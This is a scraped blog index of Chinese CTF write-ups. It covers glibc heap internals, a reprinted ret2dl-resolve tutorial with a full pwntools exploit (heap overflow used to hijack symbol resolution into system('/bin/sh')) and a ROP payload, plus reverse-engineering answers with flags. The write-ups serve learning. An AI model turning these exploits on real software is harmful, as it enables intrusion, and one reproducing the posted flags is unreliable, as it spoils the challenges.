总结基本实现了AES的基本加密算法的实现","categories":[],"tags":[]},{"title":"浅谈Linux-Heap","slug":"ǳ̸Linux-Heap","date":"2019-10-07T16:58:17.000Z","updated":"2019-10-08T07:58:36.000Z","comments":true,"path":"2019/10/07/ǳ̸Linux-Heap/","link":"","permalink":"http://yoursite.com/2019/10/07/ǳ̸Linux-Heap/","excerpt":"","text":"最近的CTF比赛单纯的栈溢出已经很少见了，基本都是堆题，所以被迫开始学习堆。堆的利用相对于栈溢出和格式化字符串会复杂很多，这里对堆的一些基本知识点和实现原理进行了一些小小的总结 堆 堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。 先看看堆在虚拟内存中的位置 堆不同于栈，堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的，且堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现 初始时，堆的起始地址 start_brk以及堆的当前末尾 brk指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同 不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。 开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。 在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。 堆管理器处于用户程序与内核中间，主要做以下工作 响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。 管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。 Linux操作系统中对堆操作的是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能 Chunk我们都知道，在C中动态分配内存，使用的是malloc。其在GNU C(glibc)中的实现则是基于dlmalloc的ptmalloc。ptmalloc的基本思路是将堆上的内存区域划分为多个chunk，在分配/回收内存时，对chunk进行分割、回收等操作 具体地，每个chunk除了包含最终返回用户的那部分mem(user data (用户数据区))，还包含头部用于保存chunk大小的相关信息。在32位系统下，chunk头的大小为8 Bytes，且每个chunk的大小也是8 Bytes的整数倍 一个典型的chunk如下图所示： 我们称前两个字段称为 chunk header，后面的部分称为 men（user data）。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。 chunk头包括以下两部分： presize 只有在前面一个堆块是空闲的时候才有指，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0 size 当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息 size字段的最后3bit相当于三个 flag ，有另外的作用 NON_MAIN_ARENA 这个堆块是否位于主线程 IS_MAPPED 记录当前 chunk 是否是由 mmap 分配的 PREV_INUSE 记录前一个 chunk 块是否被分配 我们需要记住的是最后一位 PREV_INUSE：用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1 所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节，所以前一个堆块的释放与否都和这两个字段（pre_size、size）的值有关，这是因为便于内存的释放操作（free） 如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，具体如下： fd 下一个未被使用的chunk的地址 bk 上一个未被使用的chunk的地址 可以看到，chunk头中包含的大小信息，主要用来在获取内存中相邻chunk的地址（当前chunk地址减去前一chunk的大小，为前一chunk的地址；当前chunk地址加上当前chunk的大小，为后一chunk的地址）。而mem中的fd和bk只在当前chunk处于未被使用时才有意义。chunk 处于分配状态时，从 fd 字段开始是用户的数据。如果了解数据结构，便可以立刻看出，这些未被使用的chunks通过fd, bk组成了链表。事实上，malloc确实维护了一系列链表用于内存的分配和回收，这些链表被成为“bins” 一般来说，每个bin链表中的chunk都有相同或将近的大小。根据bin所包含chunk的大小，可以将bin分为fastbin, unsorted bin, small bin, large bin 如果我们尝试使用malloc(8) 申请到的堆块总大小为 16 + 8 + 8 + 1 = 0x21 1.第一个 16 字节是系统最小分配的内存，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。 在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节 例如，如果代码中是 malloc(0) 的话，堆管理器也会分配最小内存空间给你 2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）4.最后一个 1 字节是 PREV_INUSE 的值，只有 0 或 1两个值 复杂结构首先要明确用户在调用 malloc 函数时返回的值为一个指针，指向分配到堆空间（用户数据区），这个在最前面的那个图片也已经标出来了。 有时候题目是以更复杂的情况，用指针来表示某个数据结构的，例如下面的这个例子： max_size exist_num First_chunk 0/1 First_chunk len(first) First_chunk point_heap First_chunk 0/1 Second_chunk len(second) Second_chunk point_heap Second_chunk 左边的这个本身就是一个堆块，用来存放一些全局信息 first chunk（second chunk） 表示第一和第二个结构 point_heap 来指向存储用户数据的堆块（chunk） max_size 能够存储的最大结构数量 exist_num 已经存储的结构的数量 IDA 中常见的指针表示形式在 IDA 伪代码中的指针形式形如下面的情况： 1*(qword_6020A8 + 8) 表示取到 qword_6020A8 这个地址加 8 偏移的那个地址存储的值 汇编代码等同于： 12.text:0000000000400F85 mov rax, cs:qword_6020A8.text:0000000000400F8C mov rax, [rax+8] 简单转化一下，也就是： 1*(addr) = [addr] 链表在 pwn 的堆题目中，经常会有像一些”笔记管理系统”之类的题目，例如下面这里例子 代码提供了最基本的增删查改的功能。这个”笔记”的数据结构通常就是使用链表连接起来的，记录了当前 note 的大小、属性、内容等等。 例如，下面这个例子就是以指针为基础来存储这个 note 结构的。这里的 i 代表 note 的索引，若这里的 i = 0 时： (qword_6020A8 + 16) 就*代表从 qword_6020A8 这个地址出再往后偏移 16 个字节，取到这个地址存储的值，接着把 1 赋值给这个地方（也就是把 1 存入这个地址） 同样的 *(qword_6020A8 + 24) 就代表偏移 24 个字节处的值为 len 依次类推就可以在不连续的内存空间中，把整个 note 的数据结构存储下来了。 申请堆块的本质 堆管理器 ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块 ptmalloc2 的作用通俗的讲就是相当于一个”中间商”，在程序想要申请向系统申请堆空间时，这里的 ptmalloc2 就会申请一块很大的空间，并根据算法从这些内存中把空间真正的分配给程序。 简单点说就是下面这个图中的情况： 这里的举一个最简单的例子： 1234567#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;int main()&#123; char *p; p = malloc(10); return 0;&#125; 在 gdb 中进行调试，在call malloc处下一个断点，在这里使用 vmmap 命令，查看内存分布。可以看到此时并没有发现堆段 在 gdb 中进行调试，在 call malloc 处下一个断点，在这里使用 vmmap 命令，查看内存分布。可以看到此时并没有发现堆段 单步 n ，vmmap 命令再次查看内存，发现出现了堆段 但是这里我们明明只是申请了 10 字节的大小，但是为什么这里的为什么给了这么大的堆段呢？ 10x00602000 ~ 0x00623000 计算一下，刚好是 132 kB 1(0x00623000-0x00602000)/1024 = 132 kB 原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以这个区域叫做 main arena 也就是说这 132 KB 是”厂家”（内核）批发给”中间商”（ptmalloc2）的货物，以便下次程序在向系统申请小内存的时候，直接去”中间商”去取就行了，他就会在这 132KB 中按照要申请”货物”的多少进行分配下去。若”中间商”缺货了话，ptmalloc2 就继续去找”厂家”（系统内核）去取货 查看已分配的堆内存分布在上面我们动态调试的时候已经执行了 malloc 函数，申请到的堆指针是保存在 eax 中的 我们这里使用下面这个命令来查看内存堆块情况： 1x/32gx 0x602010-0x10 32位的程序使用 x/32xw 比较直观一点 这里减去 0x10 表示从堆块的头部开始观察（包含 pre size 和 size 字段） main_arena 与 top chunkmain_arena这个 main_arena 其实就是 ptmalloc2 堆管理器通过与操作系统内核进行交互申请到的，也就是相当于上面所说的”批发”到的一堆货物 因为是主线程分配的，所以叫做main arena，通过增加 program break location 的方式来增加 main arena 的大小。 使用 brk 方式扩展内存的方式这里就不说了，感兴趣可以自己去查一下资料 在 gdb 调试中，使用 1x/32gx &amp;main_arena 可以看到 main_arena 的内存分配情况。 top chunk顾名思义，是堆中第一个堆块。相当于一个”带头大哥”，程序以后分配到的内存到要放在他的后面。 在系统当前的所有 free chunk(无论那种 bin)，都无法满足用户请求的内存大小的时候，将此 chunk 当做一个应急消防员，分配给用户使用。 简单点说，也就是在程序在向堆管理器申请内存时，没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他 free 函数和 binsbins 这个概念是与内存回收相关的，也就是堆管理器会根据用户已经申请到的内存空间大小进行释放，来决定放入哪类 bins 当作去。bins 直接翻译过来就是”垃圾桶”的意思，所以在系统在决定使用哪个 bins 时可以看作为”垃圾的分类”。 主要的 bins 分为以下几类，这里重点讲解一下 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。 free 函数free 函数的使用是和 bins 的分配息息相关的。用一个简单的例子来理解一下 free 函数的实现原理。 代码如下： 123456789#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; char *p; p = malloc(10); memcpy(p,\"Hello\",5); free(p); return 0;&#125; 程序将 “Hello” 字符串复制到申请到的堆内存空间中。 编译后用 gdb 调试，在 call memcpy 处下一个断点，单步后将 “Hello” 复制到堆块中 继续使用 x/32gx 0x602010-0x10 命令查看堆块情况 继续单步 n，执行 free 函数之后，查看堆块情况 这里可以看出原本堆块中存储的内容已经被清空，然后查看一下 main_arena 的值，发现其中 +0x8 的偏移处，存储了指向已经 free 了的指针（指向头部，而不是 user data） 小总结 所以调用 free 函数以后程序做了两件事：1.清空此堆块的 user data2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中） fast bin顾名思义，就是为了快速重新分配回内存而存在的一个结构。 fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。 引用一张图： 这里的横向排列的就是 main_arene（fast bin）的内存地址 假如此时 0x0804a000 处的堆块（实际堆块中的 size 字段要减去 PREV_INUSE 字段值 1，）已经被 free 了，那么他就会被存储在表示 40 bytes 的 fast bin 的内存地址里 注意：这里把指针和地址区别开。地址存储的是指针，64 位的指针占 8 个字节。 假设我们现在还是以 64 位下的 malloc(10) 为例子。 根据前面那个 free 函数的例子，查看 main_arena 地址中的指针值我们可以看出来，+0x8 偏移处才是指向 malloc(10) 的堆块的指针（这个堆块分配后的 user data 实际大小是 16 字节） 12gdb-peda$ x/2gx &amp;main_arena (16 bytes 的链表头)0x7ffff7dd3760 &lt;main_arena&gt;: 0x0000000000000000 0x0000000000602000 所以这个 16 字节的堆块的指针会被插入属于他的这个链表队列中，也就是如下的情况。 所以这也就印证了在 main_arena 中分别表示 16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes 的内存地址中分别存储着已经 free 的而且满足这个大小的 chunk的指针。 fast bin 的特性 1.使用单链表来维护释放的堆块也就是和上图一样，从main_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。 如下图所示，此时就是一个单链表结构 2.采用后进先出的方式维护链表（类似于栈的结构）当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，会选择后面新加入的堆块拿来先进行内存分配 如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。 这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块，此时 main_arena 就指向了这里。也就是恢复到了上面第一个图中的情况。 small bin顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。 如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。 unsorted bin 当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。 unsorted bin 与 fast bin 不同，他使用双向链表对 chunk 进行连接 unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。 参考资料： 1、CTF pwn 中最通俗易懂的堆入坑指南[https://www.anquanke.com/post/id/163971] 2、浅析Linux堆溢出之fastbin[https://www.freebuf.com/news/88660.html] 3、CTF Wiki[]","categories":[],"tags":[]},{"title":"ret2dl-resolve详解","slug":"ret2dl-resolve╧Ω╜Γ","date":"2019-10-07T16:46:50.000Z","updated":"2019-10-08T08:03:04.000Z","comments":true,"path":"2019/10/07/ret2dl-resolve╧Ω╜Γ/","link":"","permalink":"http://yoursite.com/2019/10/07/ret2dl-resolve╧Ω╜Γ/","excerpt":"","text":"ret2dl-resolve详解转载自看雪论坛，原文：https://bbs.pediy.com/thread-227034.htm 0x00 前言最近做RCTF，结果pwn一道没做出来（虽然精力全放在更擅长的reverse上了），然后复盘的时候发现RNote4有个关于ret2dl-resolve的利用，遂在网上查之，发现很多资料讲的不是很清楚，但是还是慢慢琢磨弄懂了。这个技巧貌似是一个挺基础的技巧，玩pwn一段时间了，发现自己还有这种知识遗漏。。。所以这篇文章新手向，大神可以绕道了。。。。 0x01 ELF文件格式以及动态链接我们知道，无论是windows下还是linux下，程序想要调用其他动态链接库的函数，必须要在程序加载的时候动态链接，比方说，windows下，叫作IAT表，linux下，叫作GOT表。调用库函数时，会有个类似call [xxx] 或者 jmp [xxx]的指令，其中xxx是IAT表或者GOT表的地址。在这里因为是linux的pwn，我们主要讨论GOT表，以及在linux下更为常见的jmp [xxx]. linux如何调用库函数首先一个hello world程序 123456#include &lt;stdio.h&gt;int main()&#123; puts(\"Hello Pwn\\n\"); return 0;&#125;//gcc -m32 -fno-stack-protector -no-pie -s hellopwn.c 其中，这个puts是调用的libc这个动态链接库导出的一个函数。编译它，看看puts是怎么被调用的。 1234push offset s ; \"Hello Pwn\\n\"call _puts ;这里调用puts_puts:jmp ds:off_804A00C ; puts会call到这里，这里就是“jmp [GOT表地址]”的这样一条指令 跟一下，看看这个off_804A00C在第一次调用时是什么东西 可以发现，是0x80482e6这个地址，并不直接是libc的puts函数的地址。这是因为linux在程序加载时使用了延迟绑定(lazy load)，只有等到这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会再push一个0，再push一个dword ptr [0x804a004]，待会会说这两个参数是什么意思，最后跳到libc的_dl_runtime_resolve去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它。而这个函数的地址也是从GOT表取并且jmp [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定，如果把它也延迟绑定就会出现先有鸡还是先有蛋的问题了。 ELF关于动态链接的一些关键sectionsection，segment是什么东西不说了，不知道的话呢谷歌百度一下 .dynamic包含了一些关于动态链接的关键信息，在这个hellopwn上它长这样，事实上这个section所有程序都差不多 这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针，可以readelf -S hellopwn看一下，会发现这三个section的地址跟在上图所示的地址是一样的。 .dynstr 一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x804821C的偏移。 .dynsym 这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下 123456789typedef struct&#123; Elf32_Word st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了 Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; //对于导入函数符号而言，它是0x12 unsigned char st_other; Elf32_Section st_shndx;&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0 .rel.plt 这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下： 12345678typedef struct&#123; Elf32_Addr r_offset; //指向GOT表的指针 Elf32_Word r_info; //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07 //1和3是这个导入函数的符号在.dynsym中的下标， //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应&#125; Elf32_Rel; _dl_runtime_resolve做了什么这个想要深入理解的话呢可以去看glibc/elf/dl-runtime.c的源码，这里我就不贴了，因为有一堆宏，看着让人晕，我就直接说下他做了哪些事情。 首先说第一个参数，[0x804a004]是一个link_map的指针，这个结构是干什么的，我们不关心，但是有一点要知道，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访问到.dynamic这个section 0x08049f14是.dynamic的指针，与前面图中一致；而第二个参数，是当前要调用的导入函数在.rel.plt中的偏移（不过64位的话就直接是index下标），比方说这里，puts就是0，__libc_start_main就是1*sizeof(Elf32_Rel)=8。 _dl_runtime_resolve会 用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针 .rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym .dynstr + sym-&gt;st_name得出符号名字符串指针 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表 调用这个函数 如果阅读libc源码的话会发现实际顺序可能跟我上面所说的有一点偏差，不过意思都一样，我这样说会比较好理解。 0x02 ret2dl-resolve 利用那么，这个怎么去利用呢，有两种利用方式 改写.dynamic的DT_STRTAB这个只有在checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用free(&quot;bin/sh&quot;)（因为只有第一次才会resolve），就等于调用了system(&quot;/bin/sh&quot;)。 例题就是RCTF的RNote4，题目是一道堆溢出，NO RELRO而且NO PIE溢出到后面的指针可以实现任意地址写。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647unsigned __int64 edit()&#123; unsigned __int8 a1; // [rsp+Eh] [rbp-12h] unsigned __int8 size; // [rsp+Fh] [rbp-11h] note *v3; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); a1 = 0; read_buf((char *)&amp;a1, 1u); if ( !notes[a1] ) exit(-1); v3 = notes[a1]; size = 0; read_buf((char *)&amp;size, 1u); read_buf(v3-&gt;buf, size); // heap overflow堆溢出 return __readfsqword(0x28u) ^ v4;&#125; unsigned __int64 add()&#123; unsigned __int8 size; // [rsp+Bh] [rbp-15h] int i; // [rsp+Ch] [rbp-14h] note *v3; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); if ( number &gt; 32 ) exit(-1); size = 0; v3 = (note *)calloc(0x10uLL, 1uLL); if ( !v3 ) exit(-1); read_buf((char *)&amp;size, 1u); if ( !size ) exit(-1); v3-&gt;buf = (char *)calloc(size, 1uLL); //堆中存放了指针，所以可以通过这个任意写 if ( !v3-&gt;buf ) exit(-1); read_buf(v3-&gt;buf, size); v3-&gt;size = size; for ( i = 0; i &lt;= 31 &amp;&amp; notes[i]; ++i ) ; notes[i] = v3; ++number; return __readfsqword(0x28u) ^ v4;&#125; 所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写.dynamic指向字符串表的指针，使其指向一块可写内存，比如.bss，然后再写这块内存，使得相应偏移出刚好有个system\\x00。exp如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import * g_local=True#e=ELF('./libc.so.6')#context.log_level='debug'if g_local: sh =process('./RNote4')#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125; gdb.attach(sh)else: sh = remote(\"rnote4.2018.teamrois.cn\", 6767) def add(content): assert len(content) &lt; 256 sh.send(\"\\x01\") sh.send(chr(len(content))) sh.send(content) def edit(idx, content): assert idx &lt; 32 and len(content) &lt; 256 sh.send(\"\\x02\") sh.send(chr(idx)) sh.send(chr(len(content))) sh.send(content) def delete(idx): assert idx &lt; 32 sh.send(\"\\x03\") sh.send(chr(idx)) #伪造的字符串表，(0x457-0x3f8)刚好是\"free\\x00\"字符串的偏移payload = \"C\" * (0x457-0x3f8) + \"system\\x00\"#先新建两个notesadd(\"/bin/sh\\x00\" + \"A\" * 0x10)add(\"/bin/sh\\x00\" + \"B\" * 0x10)#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓edit(0, \"/bin/sh\\x00\" + \"A\" * 0x10 + p64(33) + p64(0x18) + p64(0x601EB0))#将0x601EB0，即.dynamic的字符串表指针，写成0x6020C8edit(1, p64(0x6020C8)) edit(0, \"/bin/sh\\x00\" + \"A\" * 0x10 + p64(33) + p64(0x18) + p64(0x6020C8))#在0x6020C8处写入伪造的字符串表edit(1, payload) #会第一次调用free，所以实际上是system(\"/bin/sh\")被调用，如前面所说delete(0)sh.interactive() 操纵第二个参数，使其指向我们所构造的Elf32_Rel如果.dynamic不可写，那么以上方法就没用了，所以有第二种利用方法。要知道，前面的_dl_runtime_resolve在第二步时 12&gt; .rel.plt + 第二个参数`求出当前函数的重定位表项`Elf32_Rel`的指针，记作`rel&gt; 这个时候，_dl_runtime_resolve并没有检查.rel.plt + 第二个参数后是否造成越界访问，所以我们能给一个很大的.rel.plt的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说.bss。 然后第三步 12&gt; rel-&gt;r_info &gt;&gt; 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym&gt; 所以在我们所伪造的Elf32_Rel，需要放一个r_info字段，大概长这样就行0xXXXXXX07，其中XXXXXX是相对.dynsym表的下标，注意不是偏移，所以是偏移除以Elf32_Sym的大小，即除以0x10（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个Elf32_Sym。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。 然后第四步 .dynstr + sym-&gt;st_name得出符号名字符串指针 同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。 所以，最终的利用思路，大概是 构造ROP，跳转到resolve的PLT，push link_map的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的Elf32_Rel的偏移，然后是返回地址（system的话无所谓），再然后是参数（如果是system函数的话就要是指向&quot;/bin/sh\\x00&quot;的指针） 最后来道经典例题， 123456789101112131415161718192021222324int __cdecl main(int a1)&#123; size_t v1; // eax char buf[4]; // [esp+0h] [ebp-6Ch] char v4; // [esp+18h] [ebp-54h] int *v5; // [esp+64h] [ebp-8h] v5 = &amp;a1; strcpy(buf, &quot;Welcome to XDCTF2015~!\\n&quot;); memset(&amp;v4, 0, 0x4Cu); setbuf(stdout, buf); v1 = strlen(buf); write(1, buf, v1); vuln(); return 0;&#125;ssize_t vuln()&#123; char buf[108]; // [esp+Ch] [ebp-6Ch] setbuf(stdin, buf); return read(0, buf, 256u); //栈溢出&#125;//gcc -m32 -fno-stack-protector -no-pie -s pwn200.c 明显的栈溢出，但是没给libc，ROPgadget也少，所以要用ret2dl-resolve。 利用思路如下: 第一次调用read函数，返回地址再溢出成read函数，这次参数给一个.bss的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个read之后，ROP到leave; retn的地址，以便切栈切到在.bss中我们构造的下一个ROP链 123456789payload1 = \"A\" * 108payload1 += p32(NEXT_ROP) # ebp会在这里被pop出来，到时候leave就可以切栈payload1 += p32(READ_ADDR)payload1 += p32(LEAVE_RETN)payload1 += p32(0)payload1 += p32(BUFFER - ROP_SIZE)payload1 += p32(0x100)payload1 += \"P\" * (0x100 - len(payload1))sh.send(payload1) 第二次调用read函数，此时要sendROP链以及所有相关的伪造数据结构 12345678910111213141516171819fake_Elf32_Rel = p32(STRLEN_GOT)fake_Elf32_Rel += p32(FAKE_SYMTAB_IDX) fake_Elf32_Sym = p32(FAKE_STR_OFF)fake_Elf32_Sym += p32(0)fake_Elf32_Sym += p32(0)fake_Elf32_Sym += chr(0x12) + chr(0) + p16(0) # 其它字段直接照抄IDA里面的数据就好 strings = \"system\\x00/bin/sh\\x00\\x00\" rop = p32(0) # pop ebp, 随便设反正不用了rop += p32(DYN_RESOL_PLT) # resolve的PLT，就是前面说的push link_map那个位置rop += p32(FAKE_REL_OFF) # 伪造的重定位表OFFSETrop += \"AAAA\" # 返回地址，不用了随便设rop += p32(BIN_SH_ADDR) # 参数，\"/bin/sh\" payload2 = rop + fake_Elf32_Rel + fake_Elf32_Sym + strings sh.send(payload2) 至于offset这些东西要自己慢慢撸，反正我搞了挺久的。。。就在IDA里把地址copy出来然后慢慢算偏移就好了。。。 完整exp写的有点丑，放附件了。 PS: 其他一些大佬博客的exp我没有很看懂。。。不知道为啥要写那么长。。。我是弄懂了方法就按照自己的思路写的，不过也对就是了。。。 然后貌似有个自动得出ROP的工具叫作roputils，这样就不用自己搞这么一串ROP了。。。不过用工具前还是要先搞懂原理的不然就成脚本小子了嘛。。。 伪造link_map?貌似也可行，而且64位下link_map+0x1c8 好像要置0，所以可能要自己伪造link_map。但是link_map结构有点复杂，网上也没有关于这种利用方式的资料，以后有空会再研究一下。。。","categories":[],"tags":[]},{"title":"BugKu_Re(1)","slug":"BugKu-Re-1","date":"2019-10-07T09:26:59.000Z","updated":"2019-10-08T00:27:30.000Z","comments":true,"path":"2019/10/07/BugKu-Re-1/","link":"","permalink":"http://yoursite.com/2019/10/07/BugKu-Re-1/","excerpt":"","text":"入门逆向没啥好说的 12345678910111213141516171819mov byte ptr [esp+2Fh], 'f'mov byte ptr [esp+2Eh], 'l'mov byte ptr [esp+2Dh], 'a'mov byte ptr [esp+2Ch], 'g'mov byte ptr [esp+2Bh], '&#123;'mov byte ptr [esp+2Ah], 'R'mov byte ptr [esp+29h], 'e'mov byte ptr [esp+28h], '_'mov byte ptr [esp+27h], '1'mov byte ptr [esp+26h], 's'mov byte ptr [esp+25h], '_'mov byte ptr [esp+24h], 'S'mov byte ptr [esp+23h], '0'mov byte ptr [esp+22h], '_'mov byte ptr [esp+21h], 'C'mov byte ptr [esp+20h], '0'mov byte ptr [esp+1Fh], 'O'mov byte ptr [esp+1Eh], 'L'mov byte ptr [esp+1Dh], '&#125;' flag{Re_1s_S0_C0OL} Easy_vb没啥好说的 1234567.text:00401A48 dword_401A48 dd 33AD4EE1h, 11CF6699h, 0AA000CB7h, 93D36000h, 2Eh.text:00401A48 ; DATA XREF: .text:00402398↓o.text:00401A48 ; .text:0040241E↓o ....text:00401A5C aMctfN3tRev1sE4: ; DATA XREF: .text:004023A9↓o.text:00401A5C text \"UTF-16LE\", 'MCTF&#123;_N3t_Rev_1s_E4ay_&#125;',0.text:00401A8C dd 14h.text:00401A90 aTryAgain: ; DATA XREF: .text:00402473↓o flag{N3t_Rev_1s_E4ay} Easy_re没啥好说的，OD载入easy_vb.exe，右键中文字符串智能搜索,发现疑似flag字符串 DUTCTF{We1c0met0DUTCTF} 游戏过关修改Path法搜索关键字符串“flag”直接找到main函数，我们找到了一个jnz和call的地方，因为不是flag的直接比较，所以想法是跳转至成功函数输出flag，总之就是寻找各种跳转函数，最后跳到0x0045F66C这个调用sub_45E940函数的地址即可 直接逻辑法搜索关键字符串“flag”直接找到main函数，然后修改常见函数名得到主函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869void main()&#123; signed int i; // [esp+DCh] [ebp-20h] int v1; // [esp+F4h] [ebp-8h] printf(&amp;unk_50B110); printf(&amp;unk_50B158); printf(&amp;unk_50B1A0); printf(&amp;unk_50B1E8); printf(&amp;unk_50B230); printf(&amp;unk_50B278); printf(&amp;unk_50B2C0); printf(&amp;unk_50B308); printf(\"二 |\\n\"); printf(\"| by 0x61 |\\n\"); printf(\"| |\\n\"); printf(\"|------------------------------------------------------|\\n\"); printf( \"Play a game\\n\" \"The n is the serial number of the lamp,and m is the state of the lamp\\n\" \"If m of the Nth lamp is 1,it's on ,if not it's off\\n\" \"At first all the lights were closed\\n\"); printf(\"Now you can input n to change its state\\n\"); printf( \"But you should pay attention to one thing,if you change the state of the Nth lamp,the state of (N-1)th and (N+1)th w\" \"ill be changed too\\n\"); printf(\"When all lamps are on,flag will appear\\n\"); printf(\"Now,input n \\n\"); while ( 1 ) &#123; while ( 1 ) &#123; printf(\"input n,n(1-8)\\n\"); getchar(); printf(\"n=\"); scanf(\"%d\", &amp;v1); printf(\"\\n\"); if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 8 ) 